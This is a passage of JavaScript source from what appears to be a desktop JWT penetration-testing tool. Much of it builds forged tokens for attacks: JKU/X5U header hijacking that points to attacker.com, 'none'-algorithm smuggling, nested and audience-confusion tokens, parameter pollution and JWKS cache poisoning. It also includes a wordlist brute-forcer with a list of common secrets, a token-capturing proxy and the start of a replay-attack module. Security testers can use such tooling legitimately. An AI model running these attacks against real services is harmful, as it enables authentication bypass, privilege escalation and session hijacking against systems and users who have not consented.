                n: "0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx4cbbfAAtVT86zwu1RK7aPFFxuhDR1L6tSoc_BJECPebWKRXjBZCiFV4n3oknjhMstn64tZ_2W-5JsGY4Hc5n9yBXArwl93lqt7_RN5w6Cf0h4QyQ5v-65YGjQR0_FDW2QvzqY368QQMicAtaSqzs8KJZgnYb9c7d0zgdAZHzu6qMQvRL5hajrn1n91CbOpbISD08qNLyrdkt-bFTWhAI4vMQFh6WeZu0fM4lFd2NcRwr3XPksINHaQ-G_xBniIqbw0Ls1jF44-csFCur-kEgU8awapJzKnqDKgw",
                e: "AQAB"
            }]
        };

        return {
            description: 'JKU URL Hijacking - points to attacker-controlled JWKS',
            token: attackToken,
            maliciousJWKS: JSON.stringify(maliciousJWKS, null, 2),
            impact: 'Complete control over key verification process',
            usage: `1. Host the JWKS at ${maliciousJKU}\n2. Sign the token with your private key\n3. Application will fetch your malicious JWKS`
        };
    }

    generateX5UExploitAttack(decoded) {
        const maliciousX5U = 'https://attacker.com/malicious-cert-chain.pem';
        const header = { ...decoded.header, x5u: maliciousX5U };
        const headerB64 = this.base64UrlEncode(JSON.stringify(header));
        const payloadB64 = this.base64UrlEncode(JSON.stringify(decoded.payload));
        const attackToken = `${headerB64}.${payloadB64}.[SIGN_WITH_MALICIOUS_CERT]`;

        return {
            description: 'X5U Certificate Chain Exploit - points to malicious certificate',
            token: attackToken,
            impact: 'Certificate chain manipulation and verification bypass',
            usage: `1. Create malicious certificate chain\n2. Host it at ${maliciousX5U}\n3. Sign token with corresponding private key`
        };
    }

    generateJWTSmugglingAttack(decoded) {
        const attacks = [];

        const doubleHeader = JSON.stringify({ ...decoded.header, alg: 'none' });
        const normalHeader = JSON.stringify(decoded.header);
        const smuggledHeader = this.base64UrlEncode(doubleHeader) + '.' + this.base64UrlEncode(normalHeader);
        attacks.push({
            type: 'Double Header',
            token: `${smuggledHeader}.${this.base64UrlEncode(JSON.stringify(decoded.payload))}.`,
            description: 'Different libraries may parse different headers'
        });

        const embeddedPayload = {
            ...decoded.payload,
            embedded: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.'
        };
        attacks.push({
            type: 'Embedded JWT',
            token: `${this.base64UrlEncode(JSON.stringify(decoded.header))}.${this.base64UrlEncode(JSON.stringify(embeddedPayload))}.${decoded.signature}`,
            description: 'Some parsers may extract the embedded JWT'
        });

        return {
            description: 'JWT Smuggling - exploits parsing differences between libraries',
            attacks: attacks,
            impact: 'Bypass security controls through parser confusion',
            usage: 'Test these tokens against different JWT libraries to find parsing inconsistencies'
        };
    }

    generateNestedJWTAttack(decoded) {
        const innerJWT = this.base64UrlEncode(JSON.stringify({ alg: 'none', typ: 'JWT' })) + '.' +
                         this.base64UrlEncode(JSON.stringify({ sub: 'admin', role: 'superuser', exp: 9999999999 })) + '.';

        const nestedPayload = {
            ...decoded.payload,
            jwt: innerJWT,
            nested_token: innerJWT
        };

        const attackToken = `${this.base64UrlEncode(JSON.stringify(decoded.header))}.${this.base64UrlEncode(JSON.stringify(nestedPayload))}.${decoded.signature}`;

        return {
            description: 'Nested JWT Attack - JWT within JWT for privilege escalation',
            token: attackToken,
            innerJWT: innerJWT,
            impact: 'Privilege escalation through nested token confusion',
            usage: 'Application may process the inner JWT with elevated privileges'
        };
    }

    generateAudienceConfusionAttack(decoded) {
        const attacks = [];

        const multiAudPayload = { ...decoded.payload, aud: ['service1', 'service2', 'admin-panel'] };
        attacks.push({
            type: 'Multi-Audience',
            token: `${this.base64UrlEncode(JSON.stringify(decoded.header))}.${this.base64UrlEncode(JSON.stringify(multiAudPayload))}.${decoded.signature}`,
            description: 'Token valid for multiple services'
        });

        const wildcardPayload = { ...decoded.payload, aud: '*' };
        attacks.push({
            type: 'Wildcard Audience',
            token: `${this.base64UrlEncode(JSON.stringify(decoded.header))}.${this.base64UrlEncode(JSON.stringify(wildcardPayload))}.${decoded.signature}`,
            description: 'Universal audience token'
        });

        const emptyAudPayload = { ...decoded.payload, aud: '' };
        attacks.push({
            type: 'Empty Audience',
            token: `${this.base64UrlEncode(JSON.stringify(decoded.header))}.${this.base64UrlEncode(JSON.stringify(emptyAudPayload))}.${decoded.signature}`,
            description: 'No audience restriction'
        });

        return {
            description: 'Audience Confusion - exploit audience validation weaknesses',
            attacks: attacks,
            impact: 'Cross-service token reuse and privilege escalation',
            usage: 'Test these tokens against different services to find audience validation flaws'
        };
    }

    generateParameterPollutionAttack(decoded) {
        const attacks = [];

        const pollutedHeader1 = `{"alg":"${decoded.header.alg}","alg":"none","typ":"JWT"}`;
        attacks.push({
            type: 'Algorithm Pollution',
            token: `${this.base64UrlEncode(pollutedHeader1)}.${this.base64UrlEncode(JSON.stringify(decoded.payload))}.`,
            description: 'Conflicting algorithm values'
        });

        const pollutedPayload = JSON.stringify(decoded.payload).slice(0, -1) + ',"sub":"admin"}';
        attacks.push({
            type: 'Subject Pollution',
            token: `${this.base64UrlEncode(JSON.stringify(decoded.header))}.${this.base64UrlEncode(pollutedPayload)}.${decoded.signature}`,
            description: 'Duplicate subject claims'
        });

        return {
            description: 'Parameter Pollution - duplicate parameters with conflicting values',
            attacks: attacks,
            impact: 'Parser confusion leading to security bypass',
            usage: 'Different parsers may handle duplicate parameters differently'
        };
    }

    generateTimingAttack(decoded) {
        const timingPayloads = [];

        for (let i = 0; i < 10; i++) {
            const modifiedPayload = { ...decoded.payload, timing_test: i };
            const token = `${this.base64UrlEncode(JSON.stringify(decoded.header))}.${this.base64UrlEncode(JSON.stringify(modifiedPayload))}.${decoded.signature}${i}`;
            timingPayloads.push({
                id: i,
                token: token
            });
        }

        return {
            description: 'Timing Attack - exploit signature verification timing differences',
            tokens: timingPayloads,
            impact: 'Information disclosure through timing side-channels',
            usage: 'Send these tokens and measure response times to detect timing differences in signature verification'
        };
    }

    generateJWTSidejackingAttack(decoded) {
        const attacks = [];

        const fixedPayload = { ...decoded.payload, jti: 'fixed-session-id' };
        attacks.push({
            type: 'Session Fixation',
            token: `${this.base64UrlEncode(JSON.stringify(decoded.header))}.${this.base64UrlEncode(JSON.stringify(fixedPayload))}.${decoded.signature}`,
            description: 'Fixed session identifier for hijacking'
        });

        const longLivedPayload = { ...decoded.payload, exp: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60) };
        attacks.push({
            type: 'Long-lived Token',
            token: `${this.base64UrlEncode(JSON.stringify(decoded.header))}.${this.base64UrlEncode(JSON.stringify(longLivedPayload))}.${decoded.signature}`,
            description: 'Token valid for 1 year'
        });

        return {
            description: 'JWT Sidejacking - session hijacking specific to JWTs',
            attacks: attacks,
            impact: 'Session hijacking and unauthorized access',
            usage: 'Use these tokens to test session management vulnerabilities'
        };
    }

    generateJWKSPoisoningAttack(decoded) {
        const poisonedJWKS = {
            keys: [
                {
                    kty: "RSA",
                    use: "sig",
                    kid: decoded.header.kid || "default",
                    n: "malicious-key-data-that-will-verify-our-signature",
                    e: "AQAB"
                },
                {
                    kty: "RSA",
                    use: "sig",
                    kid: "cache-poison",
                    n: "another-malicious-key-for-cache-poisoning-attack",
                    e: "AQAB"
                }
            ]
        };

        const header = { ...decoded.header, jku: 'https://attacker.com/poisoned-jwks.json' };
        const attackToken = `${this.base64UrlEncode(JSON.stringify(header))}.${this.base64UrlEncode(JSON.stringify(decoded.payload))}.[SIGN_WITH_POISON_KEY]`;

        return {
            description: 'JWKS Cache Poisoning - poison key cache with malicious keys',
            token: attackToken,
            poisonedJWKS: JSON.stringify(poisonedJWKS, null, 2),
            impact: 'Long-term compromise of key verification process',
            usage: 'Host poisoned JWKS to contaminate application key cache'
        };
    }

    generateQuantumPrepAttack(decoded) {
        const quantumVulnerable = ['RS256', 'RS384', 'RS512', 'ES256', 'ES384', 'ES512'];
        const isVulnerable = quantumVulnerable.includes(decoded.header.alg);

        const analysis = {
            currentAlgorithm: decoded.header.alg,
            quantumVulnerable: isVulnerable,
            recommendation: isVulnerable ? 'Migrate to post-quantum algorithms' : 'Algorithm is quantum-resistant',
            estimatedBreakTime: isVulnerable ? '2030-2035 (estimated)' : 'N/A',
            alternativeAlgorithms: ['CRYSTALS-Dilithium', 'FALCON', 'SPHINCS+']
        };

        const quantumSafePayload = {
            ...decoded.payload,
            quantum_safe: true,
            algorithm_migration_needed: isVulnerable,
            recommended_migration_date: '2025-12-31'
        };

        const demoToken = `${this.base64UrlEncode(JSON.stringify(decoded.header))}.${this.base64UrlEncode(JSON.stringify(quantumSafePayload))}.${decoded.signature}`;

        return {
            description: 'Quantum Computing Preparedness Analysis',
            analysis: analysis,
            token: demoToken,
            impact: isVulnerable ? 'Future cryptographic compromise when quantum computers are available' : 'Algorithm is currently quantum-resistant',
            usage: 'Assess quantum vulnerability and plan migration to post-quantum cryptography'
        };
    }

    displayAttackResults(attackType, payload) {
        const resultsContainer = document.getElementById('attack-results');
        const payloadsContainer = document.getElementById('attack-payloads');

        const attackResult = document.createElement('div');
        attackResult.className = 'attack-result';

        let content = `
            <div class="attack-result-header">
                <h4>${attackType.charAt(0).toUpperCase() + attackType.slice(1).replace(/-/g, ' ')} Attack</h4>
            </div>
            <div class="attack-result-content">
                <p><strong>Description:</strong> ${payload.description}</p>
                <p><strong>Impact:</strong> ${payload.impact}</p>
                <p><strong>Usage:</strong> ${payload.usage}</p>
        `;

        if (payload.token) {
            const uniqueId = `token-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
            content += `
                <div class="attack-token">
                    <label>Generated Token:</label>
                    <textarea readonly rows="3" id="${uniqueId}">${payload.token}</textarea>
                    <button class="btn btn-sm btn-outline dynamic-copy-btn" data-target="${uniqueId}">
                        <i class="fas fa-copy"></i> ${i18n.t('common.copy')}
                    </button>
                </div>
            `;
        }

        if (payload.attacks) {
            content += `<div class="attack-tokens"><label>Generated Attacks:</label>`;
            payload.attacks.forEach((attack, index) => {
                const uniqueId = `attack-${Date.now()}-${index}-${Math.random().toString(36).substr(2, 9)}`;
                content += `
                    <div class="attack-token-item">
                        <strong>${attack.type || attack.secret || `Attack ${index + 1}`}:</strong>
                        ${attack.description ? `<p><em>${attack.description}</em></p>` : ''}
                        <textarea readonly rows="2" id="${uniqueId}">${attack.token}</textarea>
                        <button class="btn btn-sm btn-outline dynamic-copy-btn" data-target="${uniqueId}">
                            <i class="fas fa-copy"></i> ${i18n.t('common.copy')}
                        </button>
                    </div>
                `;
            });
            content += `</div>`;
        }

        if (payload.tokens) {
            content += `<div class="attack-tokens"><label>Timing Test Tokens:</label>`;
            payload.tokens.forEach(token => {
                const uniqueId = `timing-${Date.now()}-${token.id}-${Math.random().toString(36).substr(2, 9)}`;
                content += `
                    <div class="attack-token-item">
                        <strong>Test ${token.id}:</strong>
                        <textarea readonly rows="2" id="${uniqueId}">${token.token}</textarea>
                        <button class="btn btn-sm btn-outline dynamic-copy-btn" data-target="${uniqueId}">
                            <i class="fas fa-copy"></i> ${i18n.t('common.copy')}
                        </button>
                    </div>
                `;
            });
            content += `</div>`;
        }

        if (payload.maliciousJWKS) {
            const uniqueId = `jwks-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
            content += `
                <div class="attack-additional">
                    <label>Malicious JWKS to Host:</label>
                    <textarea readonly rows="8" id="${uniqueId}">${payload.maliciousJWKS}</textarea>
                    <button class="btn btn-sm btn-outline dynamic-copy-btn" data-target="${uniqueId}">
                        <i class="fas fa-copy"></i> Copy JWKS
                    </button>
                </div>
            `;
        }

        if (payload.poisonedJWKS) {
            const uniqueId = `poison-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
            content += `
                <div class="attack-additional">
                    <label>Poisoned JWKS:</label>
                    <textarea readonly rows="8" id="${uniqueId}">${payload.poisonedJWKS}</textarea>
                    <button class="btn btn-sm btn-outline dynamic-copy-btn" data-target="${uniqueId}">
                        <i class="fas fa-copy"></i> Copy Poisoned JWKS
                    </button>
                </div>
            `;
        }

        if (payload.analysis) {
            content += `
                <div class="attack-analysis">
                    <label>Quantum Vulnerability Analysis:</label>
                    <pre>${JSON.stringify(payload.analysis, null, 2)}</pre>
                </div>
            `;
        }

        if (payload.innerJWT) {
            const uniqueId = `inner-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
            content += `
                <div class="attack-additional">
                    <label>Inner JWT:</label>
                    <textarea readonly rows="2" id="${uniqueId}">${payload.innerJWT}</textarea>
                    <button class="btn btn-sm btn-outline dynamic-copy-btn" data-target="${uniqueId}">
                        <i class="fas fa-copy"></i> Copy Inner JWT
                    </button>
                </div>
            `;
        }

        content += '</div>';
        attackResult.innerHTML = content;

        payloadsContainer.innerHTML = '';
        payloadsContainer.appendChild(attackResult);
        resultsContainer.style.display = 'block';
    }

    startBruteForce() {
        const token = document.getElementById('bruteforce-jwt-input').value;
        const wordlistText = document.getElementById('secret-wordlist').value;

        if (!token) {
            this.showToast('error', i18n.t('toast.provide_token_crack'));
            return;
        }

        if (!wordlistText) {
            this.showToast('error', i18n.t('toast.provide_wordlist'));
            return;
        }

        const wordlist = wordlistText.split('\n').filter(line => line.trim());
        if (wordlist.length === 0) {
            this.showToast('error', i18n.t('toast.wordlist_empty'));
            return;
        }

        this.bruteForceActive = true;
        document.getElementById('start-bruteforce').disabled = true;
        document.getElementById('stop-bruteforce').disabled = false;
        document.getElementById('bruteforce-progress').style.display = 'block';
        document.getElementById('bruteforce-results').style.display = 'none';

        this.performBruteForce(token, wordlist);
    }

    async performBruteForce(token, wordlist) {
        const decoded = jwt.decode(token, { complete: true });
        if (!decoded) {
            this.showToast('error', i18n.t('toast.invalid_token_crack'));
            this.stopBruteForce();
            return;
        }

        const algorithm = decoded.header.alg;
        const totalSecrets = wordlist.length;
        let tested = 0;
        const startTime = Date.now();

        for (const secret of wordlist) {
            if (!this.bruteForceActive) break;

            document.getElementById('current-secret').textContent = secret;
            document.getElementById('tested-count').textContent = tested;
            document.getElementById('remaining-count').textContent = totalSecrets - tested;

            const progress = (tested / totalSecrets) * 100;
            document.getElementById('brute-progress-fill').style.width = `${progress}%`;
            document.getElementById('brute-progress-percentage').textContent = `${Math.round(progress)}%`;

            const elapsed = (Date.now() - startTime) / 1000;
            const speed = tested / elapsed;
            document.getElementById('brute-speed').textContent = `${Math.round(speed)}/s`;

            try {
                jwt.verify(token, secret, { algorithms: [algorithm] });
                this.showCrackedSecret(secret);
                this.stopBruteForce();
                return;
            } catch (e) {
            }

            tested++;
            await new Promise(resolve => setTimeout(resolve, 1));
        }

        this.showToast('warning', i18n.t('toast.brute_force_complete'));
        this.stopBruteForce();
    }

    showCrackedSecret(secret) {
        document.getElementById('cracked-secret-value').textContent = secret;
        document.getElementById('bruteforce-results').style.display = 'block';
        this.showToast('success', i18n.t('toast.secret_cracked'));
    }

    stopBruteForce() {
        this.bruteForceActive = false;
        document.getElementById('start-bruteforce').disabled = false;
        document.getElementById('stop-bruteforce').disabled = true;
        document.getElementById('bruteforce-progress').style.display = 'none';
    }

    loadCommonSecrets() {
        const commonSecrets = [
            'secret', 'password', 'key', 'jwt', 'admin', 'test', 'secret123',
            'password123', 'admin123', 'test123', 'your-256-bit-secret',
            'your-secret-key', 'my-secret', 'super-secret', 'top-secret',
            'jwt-secret', 'jwt-key', 'authentication-key', 'signing-key',
            'hs256-secret', 'hmac-secret', 'token-secret', 'api-key',
            'private-key', 'public-key', 'session-key', 'encryption-key',
            '123456', 'qwerty', 'abc123', 'password1', 'admin1', 'test1',
            'secret1', 'key1', 'jwt1', 'token1', 'auth1', 'sign1'
        ];

        document.getElementById('secret-wordlist').value = commonSecrets.join('\n');
        this.showToast('info', `${i18n.t('toast.common_secrets_loaded')} ${commonSecrets.length} `);
    }

    generateHMACSecret() {
        const length = parseInt(document.getElementById('hmac-length').value);
        const secret = crypto.randomBytes(length).toString('base64');

        document.getElementById('hmac-secret').value = secret;
        document.getElementById('hmac-result').style.display = 'block';

        this.showToast('success', `${i18n.t('toast.hmac_secret_generated')} ${length * 8}`);
    }

    generateRSAKeys() {
        const keySize = parseInt(document.getElementById('rsa-size').value);

        try {
            const keypair = forge.pki.rsa.generateKeyPair({ bits: keySize });
            const privateKeyPem = forge.pki.privateKeyToPem(keypair.privateKey);
            const publicKeyPem = forge.pki.publicKeyToPem(keypair.publicKey);

            document.getElementById('rsa-private-key').value = privateKeyPem;
            document.getElementById('rsa-public-key').value = publicKeyPem;
            document.getElementById('rsa-result').style.display = 'block';

            this.showToast('success', `${i18n.t('toast.rsa_keys_generated')} ${keySize}`);
        } catch (error) {
            this.showToast('error', `${i18n.t('toast.key_generation_failed')}: ${error.message}`);
        }
    }

    validateToken() {
        const token = document.getElementById('validator-jwt-input').value;
        const key = document.getElementById('validator-key-input').value;

        if (!token) {
            this.showToast('error', i18n.t('toast.provide_token_validate'));
            return;
        }

        if (!key) {
            this.showToast('error', i18n.t('toast.provide_secret_key'));
            return;
        }

        try {
            const decoded = jwt.decode(token, { complete: true });
            const algorithm = decoded.header.alg;

            if (algorithm === 'none') {
                this.displayValidationResults(token, null, 'Token uses "none" algorithm', false);
                return;
            }

            try {
                const verified = jwt.verify(token, key, { algorithms: [algorithm] });
                this.displayValidationResults(token, verified, 'Token signature is valid', true);
            } catch (verifyError) {
                this.displayValidationResults(token, null, `Signature verification failed: ${verifyError.message}`, false);
            }

        } catch (error) {
            this.showToast('error', `${i18n.t('toast.token_validation_failed')}: ${error.message}`);
        }
    }

    validateSignatureOnly() {
        const token = document.getElementById('validator-jwt-input').value;
        const key = document.getElementById('validator-key-input').value;

        if (!token) {
            this.showToast('error', i18n.t('toast.provide_token_validate'));
            return;
        }

        if (!key) {
            this.showToast('error', i18n.t('toast.provide_secret_key'));
            return;
        }

        try {
            const decoded = jwt.decode(token, { complete: true });
            const algorithm = decoded.header.alg;

            jwt.verify(token, key, {
                algorithms: [algorithm],
                ignoreExpiration: true,
                ignoreNotBefore: true
            });

            this.displayValidationResults(token, null, 'Signature is valid (time claims ignored)', true);
        } catch (error) {
            this.displayValidationResults(token, null, `Signature verification failed: ${error.message}`, false);
        }
    }

    displayValidationResults(token, payload, message, isValid) {
        const resultsContainer = document.getElementById('validation-results');
        const summaryContainer = document.getElementById('validation-summary');

        const statusClass = isValid ? 'success' : 'error';
        const statusIcon = isValid ? 'fas fa-check-circle' : 'fas fa-times-circle';

        summaryContainer.innerHTML = `
            <div class="validation-item ${statusClass}">
                <i class="${statusIcon}"></i>
                <span>${message}</span>
            </div>
        `;

        if (payload) {
            const now = Math.floor(Date.now() / 1000);

            if (payload.exp) {
                const expiredClass = payload.exp < now ? 'error' : 'success';
                const expiredIcon = payload.exp < now ? 'fas fa-times-circle' : 'fas fa-check-circle';
                const expiredText = payload.exp < now ? 'Token is expired' : 'Token is not expired';

                const expiredItem = document.createElement('div');
                expiredItem.className = `validation-item ${expiredClass}`;
                expiredItem.innerHTML = `
                    <i class="${expiredIcon}"></i>
                    <span>${expiredText}</span>
                `;
                summaryContainer.appendChild(expiredItem);
            }

            if (payload.nbf) {
                const notBeforeClass = payload.nbf > now ? 'error' : 'success';
                const notBeforeIcon = payload.nbf > now ? 'fas fa-times-circle' : 'fas fa-check-circle';
                const notBeforeText = payload.nbf > now ? 'Token is not yet valid' : 'Token is valid (not before)';

                const notBeforeItem = document.createElement('div');
                notBeforeItem.className = `validation-item ${notBeforeClass}`;
                notBeforeItem.innerHTML = `
                    <i class="${notBeforeIcon}"></i>
                    <span>${notBeforeText}</span>
                `;
                summaryContainer.appendChild(notBeforeItem);
            }
        }

        resultsContainer.style.display = 'block';
    }

    sendHTTPRequest() {
        const method = document.getElementById('http-method').value;
        const url = document.getElementById('http-url').value;
        const headersText = document.getElementById('request-headers').value;
        const body = document.getElementById('request-body').value;
        const authToken = document.getElementById('auth-token').value;
        const authType = document.querySelector('input[name="auth-type"]:checked').value;

        if (!url) {
            this.showToast('error', i18n.t('toast.enter_url'));
            return;
        }

        try {
            let headers = {};
            if (headersText) {
                headersText.split('\n').forEach(line => {
                    const [key, ...valueParts] = line.split(':');
                    if (key && valueParts.length > 0) {
                        headers[key.trim()] = valueParts.join(':').trim();
                    }
                });
            }

            if (authToken) {
                if (authType === 'bearer') {
                    headers['Authorization'] = `Bearer ${authToken}`;
                } else {
                    headers['X-Auth-Token'] = authToken;
                }
            }

            const options = {
                method: method,
                headers: headers
            };

            if (body && ['POST', 'PUT', 'PATCH'].includes(method)) {
                options.body = body;
            }

            const startTime = Date.now();

            fetch(url, options)
                .then(response => {
                    const endTime = Date.now();
                    const duration = endTime - startTime;

                    const responseHeaders = {};
                    response.headers.forEach((value, key) => {
                        responseHeaders[key] = value;
                    });

                    return response.text().then(text => ({
                        status: response.status,
                        statusText: response.statusText,
                        headers: responseHeaders,
                        body: text,
                        duration: duration
                    }));
                })
                .then(result => {
                    this.displayHTTPResponse(result);
                })
                .catch(error => {
                    this.showToast('error', `${i18n.t('toast.request_failed')}: ${error.message}`);
                });

        } catch (error) {
            this.showToast('error', `${i18n.t('toast.request_config_error')}: ${error.message}`);
        }
    }

    displayHTTPResponse(result) {
        const responseContainer = document.getElementById('http-response');
        const statusElement = document.getElementById('response-status');
        const timeElement = document.getElementById('response-time');
        const bodyElement = document.getElementById('response-body');
        const headersElement = document.getElementById('response-headers');

        let statusClass = 'success';
        if (result.status >= 400 && result.status < 500) statusClass = 'warning';
        if (result.status >= 500) statusClass = 'error';

        statusElement.textContent = `${result.status} ${result.statusText}`;
        statusElement.className = `response-status ${statusClass}`;
        timeElement.textContent = `${result.duration}ms`;

        bodyElement.textContent = result.body;
        headersElement.textContent = JSON.stringify(result.headers, null, 2);

        responseContainer.style.display = 'block';
    }

    encodeBase64() {
        const plainText = document.getElementById('base64-plain').value;
        if (!plainText) {
            this.showToast('error', i18n.t('toast.enter_text_encode'));
            return;
        }

        const encoded = btoa(plainText);
        document.getElementById('base64-encoded').value = encoded;
        this.showToast('success', i18n.t('toast.text_encoded'));
    }

    decodeBase64() {
        const encodedText = document.getElementById('base64-encoded').value;
        if (!encodedText) {
            this.showToast('error', i18n.t('toast.enter_base64_decode'));
            return;
        }

        try {
            const decoded = atob(encodedText);
            document.getElementById('base64-plain').value = decoded;
            this.showToast('success', i18n.t('toast.base64_decoded'));
        } catch (error) {
            this.showToast('error', i18n.t('toast.invalid_base64'));
        }
    }


    copyToClipboard(text) {
        if (navigator.clipboard && window.isSecureContext) {
            navigator.clipboard.writeText(text).then(() => {
                this.showToast('success', i18n.t('toast.copied_clipboard'));
            }).catch((err) => {
                this.fallbackCopyToClipboard(text);
            });
        } else {
            this.fallbackCopyToClipboard(text);
        }
    }

    fallbackCopyToClipboard(text) {
        try {
            const textarea = document.createElement('textarea');
            textarea.value = text;
            textarea.style.position = 'fixed';
            textarea.style.opacity = '0';
            textarea.style.pointerEvents = 'none';
            document.body.appendChild(textarea);

            textarea.select();
            textarea.setSelectionRange(0, 99999);

            const successful = document.execCommand('copy');
            document.body.removeChild(textarea);

            if (successful) {
                this.showToast('success', i18n.t('toast.copied_clipboard'));
            } else {
                this.showToast('error', i18n.t('toast.copy_failed'));
            }
        } catch (err) {
            this.showToast('error', i18n.t('toast.copy_not_supported'));
        }
    }

    copyJWTPart(part) {
        let text = '';
        switch (part) {
            case 'header':
                text = document.getElementById('jwt-header-decoded').textContent;
                break;
            case 'payload':
                text = document.getElementById('jwt-payload-decoded').textContent;
                break;
            case 'signature':
                text = document.getElementById('jwt-signature-raw').textContent;
                break;
        }
        this.copyToClipboard(text);
    }

    generateNewTokensWithSecret(secret) {
        this.switchTab('encoder');
        document.getElementById('jwt-secret').value = secret;
        this.showToast('info', i18n.t('toast.secret_loaded_encoder'));
    }

    showToast(type, message) {
        const container = document.getElementById('toast-container');
        const toast = document.createElement('div');
        toast.className = `toast ${type}`;

        const icons = {
            success: 'fas fa-check-circle',
            error: 'fas fa-exclamation-circle',
            warning: 'fas fa-exclamation-triangle',
            info: 'fas fa-info-circle'
        };

        const messageSpan = document.createElement('span');
        messageSpan.className = 'toast-message';
        messageSpan.textContent = message;
        
        const toastContent = document.createElement('div');
        toastContent.className = 'toast-content';
        toastContent.innerHTML = `<i class="${icons[type]}"></i>`;
        toastContent.appendChild(messageSpan);
        
        toast.appendChild(toastContent);

        container.appendChild(toast);

        setTimeout(() => {
            if (toast.parentNode) {
                toast.parentNode.removeChild(toast);
            }
        }, 4000);

        toast.addEventListener('click', () => {
            if (toast.parentNode) {
                toast.parentNode.removeChild(toast);
            }
        });
    }

    base64UrlDecode(str) {
        if (!str || typeof str !== 'string') {
            throw new Error('Invalid base64url input');
        }
        if (str.length > 1000000) {
            throw new Error('Input too large');
        }
        let base64 = str.replace(/-/g, '+').replace(/_/g, '/');
        while (base64.length % 4) {
            base64 += '=';
        }
        try {
            return atob(base64);
        } catch (e) {
            throw new Error('Invalid base64url encoding');
        }
    }

    base64UrlEncode(str) {
        if (typeof str !== 'string') {
            throw new Error('Invalid input type for encoding');
        }
        if (str.length > 1000000) {
            throw new Error('Input too large');
        }
        try {
            return btoa(str)
                .replace(/\+/g, '-')
                .replace(/\//g, '_')
                .replace(/=/g, '');
        } catch (e) {
            throw new Error('Failed to encode string');
        }
    }

    initializeProxy() {
        this.proxyServer = null;
        this.capturedTokens = [];
        this.setupProxyEventListeners();
    }

    setupProxyEventListeners() {
        document.getElementById('start-proxy-btn').addEventListener('click', () => {
            this.startProxy();
        });

        document.getElementById('stop-proxy-btn').addEventListener('click', () => {
            this.stopProxy();
        });

        document.getElementById('export-ca-btn').addEventListener('click', () => {
            this.exportCACertificate();
        });

        document.getElementById('proxy-https').addEventListener('change', (e) => {
            document.getElementById('https-info').style.display = e.target.checked ? 'block' : 'none';
        });

        ipcRenderer.on('jwt-token-captured', (event, tokenData) => {
            this.addCapturedToken(tokenData);
        });

        this.checkProxyStatus();
    }

    async checkProxyStatus() {
        try {
            const result = await ipcRenderer.invoke('get-proxy-status');
            if (result.success && result.running) {
                this.updateProxyStatus('running', result.port);
                document.getElementById('start-proxy-btn').disabled = true;
                document.getElementById('stop-proxy-btn').disabled = false;
            } else {
                this.updateProxyStatus('stopped');
                document.getElementById('start-proxy-btn').disabled = false;
                document.getElementById('stop-proxy-btn').disabled = true;
            }
        } catch (error) {
        }
    }

    async startProxy() {
        const port = document.getElementById('proxy-port').value;
        const httpsEnabled = document.getElementById('proxy-https').checked;

        try {
            const result = await ipcRenderer.invoke('start-proxy', { port, httpsEnabled });
            if (result.success) {
                this.updateProxyStatus('running', port);
                this.showToast('success', `${i18n.t('toast.proxy_started')} ${port}`);
                document.getElementById('start-proxy-btn').disabled = true;
                document.getElementById('stop-proxy-btn').disabled = false;
            } else {
                this.showToast('error', result.error);
            }
        } catch (error) {
            this.showToast('error', `${i18n.t('toast.proxy_start_failed')}: ${error.message}`);
        }
    }

    async stopProxy() {
        try {
            const result = await ipcRenderer.invoke('stop-proxy');
            if (result.success) {
                this.updateProxyStatus('stopped');
                this.showToast('info', i18n.t('toast.proxy_stopped'));
                document.getElementById('start-proxy-btn').disabled = false;
                document.getElementById('stop-proxy-btn').disabled = true;
            } else {
                this.showToast('error', result.error);
            }
        } catch (error) {
            this.showToast('error', `${i18n.t('toast.proxy_stop_failed')}: ${error.message}`);
        }
    }

    updateProxyStatus(status, port = null) {
        const statusElement = document.getElementById('proxy-status');
        if (status === 'running') {
            statusElement.innerHTML = `<span data-i18n="proxy.status_running">${i18n.t('proxy.status_running')} ${port}</span>`;
            statusElement.className = 'status-info proxy-status running';
        } else {
            statusElement.innerHTML = `<span data-i18n="proxy.status_stopped">${i18n.t('proxy.status_stopped')}</span>`;
            statusElement.className = 'status-info proxy-status stopped';
        }
    }

    addCapturedToken(tokenData) {
        this.capturedTokens.unshift(tokenData);
        this.updateCapturedTokensList();
    }

    updateCapturedTokensList() {
        const listContainer = document.getElementById('captured-tokens-list');
        if (this.capturedTokens.length === 0) {
            listContainer.innerHTML = `<p>${i18n.t('toast.no_captured_tokens')}</p>`;
            return;
        }

        listContainer.innerHTML = '';
        this.capturedTokens.forEach((tokenData, index) => {
            const tokenItem = document.createElement('div');
            tokenItem.className = 'token-item';
            tokenItem.onclick = () => this.selectCapturedToken(index);
            
            const tokenPreview = document.createElement('div');
            tokenPreview.className = 'token-preview';
            tokenPreview.textContent = tokenData.token.substring(0, 100) + '...';
            
            const tokenMetadata = document.createElement('div');
            tokenMetadata.className = 'token-metadata';
            
            const urlSpan = document.createElement('span');
            urlSpan.innerHTML = '<i class="fas fa-globe"></i> ';
            urlSpan.appendChild(document.createTextNode(tokenData.url));
            
            const timeSpan = document.createElement('span');
            timeSpan.innerHTML = '<i class="fas fa-clock"></i> ';
            timeSpan.appendChild(document.createTextNode(new Date(tokenData.timestamp).toLocaleTimeString()));
            
            tokenMetadata.appendChild(urlSpan);
            tokenMetadata.appendChild(timeSpan);
            
            tokenItem.appendChild(tokenPreview);
            tokenItem.appendChild(tokenMetadata);
            
            listContainer.appendChild(tokenItem);
        });
    }

    selectCapturedToken(index) {
        const tokenData = this.capturedTokens[index];
        if (tokenData) {
            document.getElementById('jwt-input').value = tokenData.token;
            this.showTab('decoder');
            this.decodeToken();
        }
    }

    initializeReplayAttack() {
        this.replayActive = false;
        this.replayResults = [];
        this.setupReplayEventListeners();
    }

    setupReplayEventListeners() {
        document.getElementById('start-replay-btn').addEventListener('click', () => {
            this.startReplayAttack();
        });

        document.getElementById('stop-replay-btn').addEventListener('click', () => {
            this.stopReplayAttack();
        });
    }

    async startReplayAttack() {
        const token = document.getElementById('replay-token').value.trim();
        const url = document.getElementById('replay-url').value.trim();
        const method = document.getElementById('replay-method').value;
        const delay = parseInt(document.getElementById('replay-delay').value);
